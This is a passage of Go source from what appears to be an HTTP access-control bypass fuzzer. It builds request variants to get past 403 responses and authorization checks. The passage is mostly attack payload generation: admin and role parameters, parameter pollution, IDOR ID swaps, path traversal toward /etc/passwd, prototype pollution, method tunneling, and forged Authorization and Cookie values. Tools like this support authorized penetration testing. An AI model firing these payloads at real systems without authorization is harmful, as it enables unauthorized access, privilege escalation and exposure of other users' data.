	// Helper: rebuild query replacing one key's value
	replaceParam := func(key, newVal string) string {
		v := make(url.Values)
		for k, vals := range params {
			v[k] = vals
		}
		v.Set(key, newVal)
		return v.Encode()
	}

	// ── 1. Privilege escalation / 403 bypass via extra params ─────────────────
	bypassParams := []string{
		// Boolean admin flags
		"admin=true", "admin=1", "admin=yes",
		"isAdmin=true", "isAdmin=1",
		"superuser=true", "superuser=1",
		"root=1", "su=1",
		// Role escalation
		"role=admin", "role=administrator", "role=superadmin", "role=root", "role=owner",
		"group=admin", "group=administrators",
		"privilege=admin", "privilege=10",
		"level=admin", "level=10", "access=admin",
		// Auth flags
		"authenticated=true", "auth=1", "auth=bypass", "auth=admin",
		"authorized=true", "authorize=1",
		"loggedIn=true", "logged_in=true",
		// Debug/internal
		"debug=true", "debug=1",
		"test=true", "test=1",
		"internal=true", "internal=1",
		"dev=true", "dev=1", "development=true",
		"bypass=true", "override=true",
		// Token/key
		"token=admin", "token=null", "token=bypass",
		"key=admin", "secret=bypass",
		"api_key=admin", "apikey=admin",
		// Format tricks (may change parser behavior)
		"format=json", "format=xml", "format=text",
		"output=json", "output=raw",
		"callback=bypass", "jsonp=callback",
		// Version downgrade
		"version=1", "version=1.0", "v=1", "api_version=1",
		"ver=old", "v=legacy",
		// WAF evasion
		"waf=bypass", "security=off",
		"x=1", "z=1", "_=1",
		// Prototype pollution
		"__proto__[admin]=1", "constructor[prototype][admin]=true",
		// Misc
		"nocache=1", "no_cache=1", "refresh=1",
	}

	for _, bp := range bypassParams {
		if rawQ != "" {
			addQ(rawQ + "&" + bp)
			// Also prepend (first value wins in some frameworks)
			addQ(bp + "&" + rawQ)
		} else {
			addQ(bp)
		}
	}

	// ── 2. HTTP Parameter Pollution (HPP) ─────────────────────────────────────
	// Only meaningful when there are existing params
	if len(params) > 0 {
		hppValues := []string{
			"1", "0", "-1", "null", "undefined", "true", "false",
			"admin", "root", "*", "%00", "NaN", "Infinity",
		}
		for key, vals := range params {
			origVal := vals[0]
			for _, hppVal := range hppValues {
				// key=orig&key=hpp   (last wins — PHP, Flask, Express)
				addQ(rawQ + "&" + url.QueryEscape(key) + "=" + url.QueryEscape(hppVal))
				// key=hpp&…original  (first wins — ASP.NET, JSP)
				addQ(url.QueryEscape(key) + "=" + url.QueryEscape(hppVal) + "&" + rawQ)
			}

			// Array notation (PHP/Rails: key[]=val, key[0]=val)
			addQ(url.QueryEscape(key) + "%5b%5d=" + url.QueryEscape(origVal))  // key[]=val
			addQ(url.QueryEscape(key) + "%5b0%5d=" + url.QueryEscape(origVal)) // key[0]=val
			addQ(url.QueryEscape(key) + "%5b%5d=1&" + url.QueryEscape(key) + "%5b%5d=" + url.QueryEscape(origVal)) // key[]=1&key[]=orig

			// JSON-encoded value
			addQ(url.QueryEscape(key) + `={"` + key + `":"` + origVal + `","role":"admin"}`)
			addQ(url.QueryEscape(key) + `=[` + origVal + `]`)

			// Param injection via value encoding (smuggling & into value)
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(origVal+"%26admin%3d1"))
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(origVal+"&admin=1"))

			// Double-encode the param value
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(url.QueryEscape(origVal)))

			// Null-byte terminate the value
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(origVal) + "%00")
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(origVal+"\x00admin"))

			// Space / tab in value
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(origVal) + "%20admin")
			addQ(url.QueryEscape(key) + "=" + url.QueryEscape(origVal) + "%09admin")
		}
	}

	// ── 3. IDOR: numeric ID manipulation ─────────────────────────────────────
	for key, vals := range params {
		origVal := vals[0]
		if !isNumericParam(origVal) {
			continue
		}
		n, _ := strconv.Atoi(origVal)

		idorValues := []string{
			// Boundary / adjacent
			"0", "1", "-1",
			strconv.Itoa(n + 1),
			strconv.Itoa(n - 1),
			strconv.Itoa(n * 2),
			// Classic IDOR targets
			"admin", "root", "system", "null", "undefined",
			"*", "%2a", "%00",
			// Numeric overflow / limits
			"2147483647",  // MaxInt32
			"2147483648",  // MaxInt32 + 1 (overflow)
			"-2147483648", // MinInt32
			"9999999999",
			"0000000001",   // zero-padded
			// Type confusion
			fmt.Sprintf("%d.0", n),
			fmt.Sprintf("0%d", n),    // octal-looking
			fmt.Sprintf("%x", n),     // hex no prefix
			fmt.Sprintf("0x%x", n),   // hex with prefix
			fmt.Sprintf("%08d", n),   // zero-padded 8 chars
			// True/false confusion
			"true", "false",
			// UUID nil
			"00000000-0000-0000-0000-000000000000",
		}
		for _, idv := range idorValues {
			addQ(replaceParam(key, idv))
		}

		// If param looks like a sequential ID, also try a range
		if n > 0 && n < 1000 {
			for _, delta := range []int{-5, -2, 2, 5, 10, 100} {
				addQ(replaceParam(key, strconv.Itoa(n+delta)))
			}
		}
	}

	// ── 4. IDOR: UUID manipulation ────────────────────────────────────────────
	for key, vals := range params {
		origVal := vals[0]
		if !isUUIDParam(origVal) {
			continue
		}
		for _, uv := range []string{
			"00000000-0000-0000-0000-000000000000",
			"ffffffff-ffff-ffff-ffff-ffffffffffff",
			"11111111-1111-1111-1111-111111111111",
			"00000000-0000-0000-0000-000000000001",
			"00000000-0000-4000-8000-000000000000",
		} {
			addQ(replaceParam(key, uv))
		}
	}

	// ── 5. IDOR: base64-encoded ID manipulation ───────────────────────────────
	for key, vals := range params {
		origVal := vals[0]
		dec, err := base64.StdEncoding.DecodeString(origVal)
		if err == nil && len(dec) > 0 {
			// Successfully decoded: try swapping the decoded value
			for _, swapVal := range []string{"1", "0", "-1", "admin", "null"} {
				reenc := base64.StdEncoding.EncodeToString([]byte(swapVal))
				addQ(replaceParam(key, reenc))
			}
			// Try incrementing if decoded value is numeric
			if isNumericParam(string(dec)) {
				n, _ := strconv.Atoi(string(dec))
				for _, delta := range []int{-1, 1, -n, 1 - n} {
					reenc := base64.StdEncoding.EncodeToString([]byte(strconv.Itoa(n + delta)))
					addQ(replaceParam(key, reenc))
				}
			}
		}
		// Also try base64-encoding common admin values
		for _, v := range []string{"admin", "root", "1", "0", "-1"} {
			addQ(replaceParam(key, base64.StdEncoding.EncodeToString([]byte(v))))
			addQ(replaceParam(key, base64.URLEncoding.EncodeToString([]byte(v))))
		}
	}

	// ── 6. Path traversal injected into param values ──────────────────────────
	for key, vals := range params {
		origVal := vals[0]
		for _, trav := range []string{
			"../", "../../", "/../", "/etc/passwd",
			"../admin", "../../admin",
			"%2e%2e%2f", "%252e%252e%252f",
		} {
			addQ(replaceParam(key, trav))
			addQ(replaceParam(key, origVal+trav))
		}
	}

	// ── 7. Wildcard / glob injection in param values ──────────────────────────
	for key := range params {
		for _, wild := range []string{"*", "%2a", ".*", ".*.*", "%25%2a"} {
			addQ(replaceParam(key, wild))
		}
	}

	// ── 8. Fragment-based param injection (#key=val treated as param by some backends) ──
	for _, bp := range []string{"admin=1", "role=admin", "debug=1", "bypass=1"} {
		if rawQ != "" {
			set[base+"?"+rawQ+"#"+bp] = struct{}{}
			// Encoded # — some parsers process %23 as new param
			addQ(rawQ + "%23" + bp)
		} else {
			set[base+"#"+bp] = struct{}{}
			addQ("%23" + bp)
		}
	}

	// ── 9. POST body param override (via GET+body confusion) ──────────────────
	// These go into URL so the content is actually the param; callers can use -d for body
	// Add a note: these should be combined with POST method + body techniques
	// We add them as GET query variants too since some gateways pass them through
	for _, bp := range []string{"role=admin", "admin=true", "isAdmin=1"} {
		if rawQ != "" {
			addQ(rawQ + "&" + bp)
		} else {
			addQ(bp)
		}
	}

	out := make([]string, 0, len(set))
	for s := range set {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

func isNumericParam(s string) bool {
	if s == "" || len(s) > 19 {
		return false
	}
	_, err := strconv.ParseInt(s, 10, 64)
	return err == nil
}

func isUUIDParam(s string) bool {
	if len(s) != 36 {
		return false
	}
	for i, c := range s {
		switch i {
		case 8, 13, 18, 23:
			if c != '-' {
				return false
			}
		default:
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
	}
	return true
}

// ── Utils ─────────────────────────────────────────────────────────────────────
func add(set map[string]struct{}, base, p, rawq string) {
	u := base + "/" + strings.TrimPrefix(p, "/")
	if rawq != "" {
		u += "?" + rawq
	}
	set[u] = struct{}{}
}

func addPath(set map[string]struct{}, base string, parts []string, rawq string) {
	add(set, base, strings.Join(parts, "/"), rawq)
}

func joinBase(base string, rel []string) []string {
	out := make([]string, 0, len(rel))
	for _, r := range rel {
		out = append(out, base+"/"+strings.TrimPrefix(r, "/"))
	}
	return out
}

func addMany(set map[string]struct{}, urls []string, rawq string) {
	for _, u := range urls {
		if rawq != "" {
			u += "?" + rawq
		}
		set[u] = struct{}{}
	}
}

func generateMultipleSemicolonPatterns(pathParts []string) []string {
	var patterns []string
	for i := 0; i < len(pathParts)-1; i++ {
		parts    := append([]string{}, pathParts...)
		parts[i] = parts[i] + ";"
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	last    := append([]string{}, pathParts...)
	last[len(last)-1] = last[len(last)-1] + ";"
	patterns = append(patterns, strings.Join(last, "/"))

	for i := 1; i < len(pathParts); i++ {
		parts    := append([]string{}, pathParts...)
		parts[i] = ";" + parts[i]
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts)-1; i++ {
		parts := append([]string{}, pathParts...)
		for j := 0; j <= i; j++ {
			parts[j] = parts[j] + ";"
		}
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts    := append([]string{}, pathParts...)
		parts[i] = ";" + parts[i] + ";"
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	return patterns
}

func generateSemicolonCombinations(pathParts []string) []string {
	var combos []string
	for _, fn := range []func(string) string{
		func(s string) string { return ";" },
		func(s string) string { return ";" + s },
		func(s string) string { return s + ";" },
	} {
		for i := 0; i < len(pathParts); i++ {
			parts    := append([]string{}, pathParts...)
			parts[i] = fn(parts[i])
			combos = append(combos, strings.Join(parts, "/"))
		}
	}
	return combos
}

func generateFullEncodings(s string) []string {
	return []string{
		s,
		url.PathEscape(s),
		url.PathEscape(url.PathEscape(s)),
		base64.StdEncoding.EncodeToString([]byte(s)),
		base64.URLEncoding.EncodeToString([]byte(s)),
	}
}

func percentEncodeCharByChar(s string) []string {
	variants := make([]string, 0, len(s))
	for i := 0; i < len(s); i++ {
		variants = append(variants, s[:i]+fmt.Sprintf("%%%02X", s[i])+s[i+1:])
	}
	return variants
}

// ── BODY: body content-based bypass payloads ──────────────────────────────────
func generateBodyPayloads(u *url.URL) []Payload {
	base := fmt.Sprintf("%s://%s%s", u.Scheme, u.Host, u.Path)
	if u.RawQuery != "" {
		base += "?" + u.RawQuery
	}
	var payloads []Payload

	type entry struct{ body, ct string }
	entries := []entry{
		// JSON privilege escalation
		{`{"admin":true}`, "application/json"},
		{`{"role":"admin"}`, "application/json"},
		{`{"isAdmin":1,"admin":true}`, "application/json"},
		{`{"role":"administrator","privilege":"admin"}`, "application/json"},
		{`{"user":"admin","role":"admin","debug":true}`, "application/json"},
		{`{"__proto__":{"admin":true}}`, "application/json"},
		{`{"constructor":{"prototype":{"admin":true}}}`, "application/json"},
		{`{"role":["admin","user"]}`, "application/json"},
		{`{"role":null}`, "application/json"},
		{`{"id":0,"role":"admin"}`, "application/json"},
		{`{"id":-1}`, "application/json"},
		{`{"bypass":true,"admin":true}`, "application/json"},
		// Form body
		{`admin=true&role=admin`, "application/x-www-form-urlencoded"},
		{`isAdmin=1`, "application/x-www-form-urlencoded"},
		{`role=administrator`, "application/x-www-form-urlencoded"},
		{`debug=true&bypass=1`, "application/x-www-form-urlencoded"},
		{`admin=1&superuser=true`, "application/x-www-form-urlencoded"},
		{`role=admin&admin=true&isAdmin=1`, "application/x-www-form-urlencoded"},
		// XML body
		{`<?xml version="1.0"?><root><admin>true</admin></root>`, "application/xml"},
		{`<?xml version="1.0"?><root><role>admin</role></root>`, "application/xml"},
		{`<?xml version="1.0"?><root><isAdmin>1</isAdmin><role>admin</role></root>`, "application/xml"},
	}
	for _, e := range entries {
		payloads = append(payloads, Payload{
			URL:          base,
			Method:       "POST",
			ExtraHeaders: map[string]string{"Content-Type": e.ct},
			ExtraInfo:    "body",
			Data:         e.body,
		})
	}

	// Method tunneling via body
	for _, m := range []struct{ method, ct, body string }{
		{"POST", "application/x-www-form-urlencoded", "_method=DELETE"},
		{"POST", "application/x-www-form-urlencoded", "_method=PUT"},
		{"POST", "application/x-www-form-urlencoded", "X-HTTP-Method-Override=GET"},
		{"POST", "application/json", `{"_method":"GET"}`},
		{"POST", "application/json", `{"_method":"DELETE"}`},
	} {
		payloads = append(payloads, Payload{
			URL:          base,
			Method:       m.method,
			ExtraHeaders: map[string]string{"Content-Type": m.ct},
			ExtraInfo:    "body-method",
			Data:         m.body,
		})
	}

	return payloads
}

// ── Raw HTTP Request support ───────────────────────────────────────────────────

type RawRequest struct {
	Method      string
	Path        string
	RawQuery    string
	Host        string
	Headers     map[string]string // lowercase key → value
	HeaderOrder []string          // original-case keys in declaration order
	Body        string
	Scheme      string
}

func (rr *RawRequest) BaseURL() string {
	u := fmt.Sprintf("%s://%s%s", rr.Scheme, rr.Host, rr.Path)
	if rr.RawQuery != "" {
		u += "?" + rr.RawQuery
	}
	return u
}

func parseRawRequest(filename, scheme string) (*RawRequest, error) {
	raw, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("cannot read file: %w", err)
	}
	content := strings.ReplaceAll(string(raw), "\r\n", "\n")
	content = strings.ReplaceAll(content, "\r", "\n")

	headerBlock, body, _ := strings.Cut(content, "\n\n")
	lines := strings.Split(strings.TrimSpace(headerBlock), "\n")
	if len(lines) == 0 {
		return nil, fmt.Errorf("empty request file")
	}

	rr := &RawRequest{
		Headers: make(map[string]string),
		Scheme:  scheme,
		Body:    strings.TrimRight(body, "\n"),
	}

	// Request line: METHOD /path?query HTTP/1.1
	reqParts := strings.Fields(lines[0])
	if len(reqParts) < 2 {
		return nil, fmt.Errorf("invalid request line: %q", lines[0])
	}
	rr.Method = strings.ToUpper(reqParts[0])
	rawPath := reqParts[1]
	if idx := strings.Index(rawPath, "?"); idx >= 0 {
		rr.Path = rawPath[:idx]
		rr.RawQuery = rawPath[idx+1:]
	} else {
		rr.Path = rawPath
	}

	// Headers
	for _, line := range lines[1:] {
		if line == "" {
			break
		}
		idx := strings.Index(line, ":")
		if idx < 0 {
			continue
		}
		origKey := strings.TrimSpace(line[:idx])
		val := strings.TrimSpace(line[idx+1:])
		lk := strings.ToLower(origKey)
		rr.Headers[lk] = val
		rr.HeaderOrder = append(rr.HeaderOrder, origKey)
		if lk == "host" {
			rr.Host = val
		}
	}

	if rr.Host == "" {
		return nil, fmt.Errorf("no Host header in raw request file")
	}
	return rr, nil
}

// rrPayload creates a Payload from a RawRequest, carrying all non-star headers.
func rrPayload(rr *RawRequest, u, tag, data string) Payload {
	p := Payload{
		URL:          u,
		Method:       rr.Method,
		ExtraHeaders: make(map[string]string),
		ExtraInfo:    tag,
		Data:         data,
	}
	for _, origKey := range rr.HeaderOrder {
		lk := strings.ToLower(origKey)
		val := rr.Headers[lk]
		if strings.Contains(val, "*") {
			continue // star headers handled separately
		}
		if lk == "host" || lk == "user-agent" || lk == "content-length" {
			continue
		}
		p.ExtraHeaders[origKey] = val
	}
	return p
}

// buildFromRawRequest produces all bypass payloads from a parsed raw request.
// When * appears in path/query/body/headers, only those positions are fuzzed.
// Without *, all configured techniques run against the full URL with raw headers injected.
func buildFromRawRequest(rr *RawRequest, cfg Config) []Payload {
	baseURL := rr.BaseURL()

	pathHasStar  := strings.Contains(rr.Path, "*")
	queryHasStar := strings.Contains(rr.RawQuery, "*")
	bodyHasStar  := strings.Contains(rr.Body, "*")

	var headerStarKeys []string
	for _, origKey := range rr.HeaderOrder {
		lk := strings.ToLower(origKey)
		if strings.Contains(rr.Headers[lk], "*") {
			headerStarKeys = append(headerStarKeys, origKey)
		}
	}

	hasStar := pathHasStar || queryHasStar || bodyHasStar || len(headerStarKeys) > 0

	if !hasStar {
		// No injection point: apply all techniques to the base URL, injecting raw headers.
		ps := buildAllRequests(cfg, []string{baseURL})
		for i := range ps {
			for _, origKey := range rr.HeaderOrder {
				lk := strings.ToLower(origKey)
				if lk == "host" || lk == "user-agent" || lk == "content-length" {
					continue
				}
				if _, exists := ps[i].ExtraHeaders[origKey]; !exists {
					ps[i].ExtraHeaders[origKey] = rr.Headers[lk]
				}
			}
			if ps[i].Data == "" && rr.Body != "" {
				ps[i].Data = rr.Body
			}
			if ps[i].Method == "GET" && rr.Method != "" && rr.Method != "GET" {
				ps[i].Method = rr.Method
			}
		}
		return ps
	}

	var payloads []Payload

	if pathHasStar {
		parts := strings.Split(strings.TrimPrefix(rr.Path, "/"), "/")
		for i, seg := range parts {
			if strings.Contains(seg, "*") {
				payloads = append(payloads, rawPathStarPayloads(rr, parts, i)...)
				break
			}
		}
	}
	if queryHasStar {
		payloads = append(payloads, rawQueryStarPayloads(rr)...)
	}
	if bodyHasStar {
		payloads = append(payloads, rawBodyStarPayloads(rr, rr.Headers["content-type"])...)
	}
	for _, origKey := range headerStarKeys {
		payloads = append(payloads, rawHeaderStarPayloads(rr, origKey)...)
	}

	return removeDuplicatePayloads(payloads)
}

// rawPathStarPayloads applies DDS/ENC/QUICK path bypass at the * segment.
func rawPathStarPayloads(rr *RawRequest, pathParts []string, starIdx int) []Payload {
	cleanParts := make([]string, len(pathParts))
	copy(cleanParts, pathParts)
	cleanParts[starIdx] = strings.ReplaceAll(cleanParts[starIdx], "*", "x")

	cleanURL := fmt.Sprintf("%s://%s/%s", rr.Scheme, rr.Host, strings.Join(cleanParts, "/"))
	if rr.RawQuery != "" {
		cleanURL += "?" + rr.RawQuery
	}
	parsed, err := url.Parse(cleanURL)
	if err != nil {
		return nil
	}

	layer := starIdx + 1
	var urls []string
	urls = append(urls, generateDDSPayloads(parsed, layer, false)...)
	urls = append(urls, generateEncodingPayloads(parsed, layer, false)...)
	urls = append(urls, generateQuickPayloads(parsed)...)
	urls = append(urls, generateCasePayloads(parsed, layer, false)...)

	payloads := make([]Payload, 0, len(urls))
	for _, u := range urls {
		payloads = append(payloads, rrPayload(rr, u, "raw/path", rr.Body))
	}
	return payloads
}

// rawQueryStarPayloads generates bypass values for the query param containing *.
func rawQueryStarPayloads(rr *RawRequest) []Payload {
	parsed, err := url.Parse(rr.BaseURL())
	if err != nil {
		return nil
	}
	params, _ := url.ParseQuery(rr.RawQuery)

	var starKey string
	for k, vals := range params {
		if len(vals) > 0 && strings.Contains(vals[0], "*") {
			starKey = k
			break
		}
	}
	if starKey == "" {
		return nil
	}

	base := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parsed.Path)
	set := make(map[string]struct{})

	for _, bv := range []string{
		"admin", "root", "administrator", "superuser",
		"1", "0", "-1", "true", "false", "null", "undefined",
		"*", "%2a", ".*", "admin%00", "%00admin",
		`{"role":"admin"}`, "2147483647", "-2147483648",
		"00000000-0000-0000-0000-000000000000",
	} {
		v := make(url.Values)
		for k, vals := range params {
			v[k] = vals
		}
		v.Set(starKey, bv)
		set[base+"?"+v.Encode()] = struct{}{}
	}
	// HPP duplicates
	for _, bv := range []string{"admin", "1", "true", "null"} {
		set[base+"?"+rr.RawQuery+"&"+url.QueryEscape(starKey)+"="+url.QueryEscape(bv)] = struct{}{}
		set[base+"?"+url.QueryEscape(starKey)+"="+url.QueryEscape(bv)+"&"+rr.RawQuery] = struct{}{}
	}

	payloads := make([]Payload, 0, len(set))
	for u := range set {
		payloads = append(payloads, rrPayload(rr, u, "raw/query", rr.Body))
	}
	return payloads
}

// rawBodyStarPayloads replaces * in the body with format-appropriate bypass values.
func rawBodyStarPayloads(rr *RawRequest, contentType string) []Payload {
	baseURL := rr.BaseURL()
	tpl := rr.Body
	ct := strings.ToLower(contentType)

	var mutations []string
	switch {
	case strings.Contains(ct, "application/json"):
		mutations = jsonBodyValues()
	case strings.Contains(ct, "xml"):
		mutations = xmlBodyValues()
	case strings.Contains(ct, "form"):
		mutations = formBodyValues()
	default:
		trimmed := strings.TrimSpace(tpl)
		if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
			mutations = jsonBodyValues()
		} else if strings.HasPrefix(trimmed, "<") {
			mutations = xmlBodyValues()
		} else {
			mutations = formBodyValues()
		}
	}

	seen := make(map[string]struct{})
	var payloads []Payload

	for _, bv := range mutations {
		newBody := strings.ReplaceAll(tpl, "*", bv)
		if _, dup := seen[newBody]; dup {
			continue
		}
		seen[newBody] = struct{}{}
		payloads = append(payloads, rrPayload(rr, baseURL, "raw/body", newBody))
	}

	// JSON extra-field injection: append admin fields before last }
	isJSON := strings.Contains(ct, "json") ||
		strings.HasPrefix(strings.TrimSpace(strings.ReplaceAll(tpl, "*", "")), "{")
	if isJSON {
		trimmed := strings.TrimSpace(strings.ReplaceAll(tpl, "*", ""))
		if idx := strings.LastIndex(trimmed, "}"); idx >= 0 {
			for _, field := range []string{
				`"admin":true`, `"isAdmin":1`, `"role":"admin"`,
				`"privilege":"admin"`, `"superuser":true`, `"debug":true`,
			} {
				injected := trimmed[:idx] + `,` + field + `}`
				if _, dup := seen[injected]; !dup {
					seen[injected] = struct{}{}
					payloads = append(payloads, rrPayload(rr, baseURL, "raw/body-inject", injected))
				}
			}
		}
	}

	return payloads
}

// rawHeaderStarPayloads replaces * in a header value with bypass values.
func rawHeaderStarPayloads(rr *RawRequest, headerKey string) []Payload {
	baseURL := rr.BaseURL()
	lk := strings.ToLower(headerKey)
	origVal := rr.Headers[lk]

	var bvals []string
	switch {
	case strings.Contains(lk, "authorization"):
		bvals = []string{
			"", "null", "none",
			"Bearer admin", "Bearer null",
			"Bearer " + strings.Repeat("a", 32),
			"Basic YWRtaW46YWRtaW4=", "Basic YWRtaW46", "Basic Og==",
			"Token admin", "Token null",
			"admin", "bypass",
		}
	case strings.Contains(lk, "cookie"):
		bvals = []string{
			"", "null", "undefined", "admin",
			"session=admin", "role=admin", "auth=bypass",
			"1", "0", "true", "false",
		}
	default:
		bvals = []string{
			"", "null", "undefined", "bypass",
			"admin", "root", "1", "0", "true", "false",
			"*", "%2a", "localhost", "127.0.0.1",
		}
	}

	payloads := make([]Payload, 0, len(bvals))
	for _, bv := range bvals {
		newVal := strings.ReplaceAll(origVal, "*", bv)
		p := rrPayload(rr, baseURL, "raw/header", rr.Body)
		p.ExtraHeaders[headerKey] = newVal
		payloads = append(payloads, p)
	}
	return payloads
}

func jsonBodyValues() []string {
	return []string{
		"admin", "administrator", "root", "superuser",
		"true", "false", "null",
		"1", "0", "-1", "2147483647",
		`["admin"]`, `["user","admin"]`,
		`{"role":"admin"}`,
		`admin`, `admin`,
		" admin", "\tadmin", "admin%00",
	}
}

func xmlBodyValues() []string {
	return []string{
		"admin", "administrator", "root",
		"true", "1", "0",
		"<![CDATA[admin]]>",
		"admin<!--bypass-->",
		"&amp;admin",
		" admin",
	}
}

func formBodyValues() []string {
	return []string{
		"admin", "administrator", "root", "superuser",
		"1", "0", "-1", "true", "false", "null",
		"admin%00", "%00admin",
		`{"role":"admin"}`,
		"*", "%2a", ".*",
	}
}
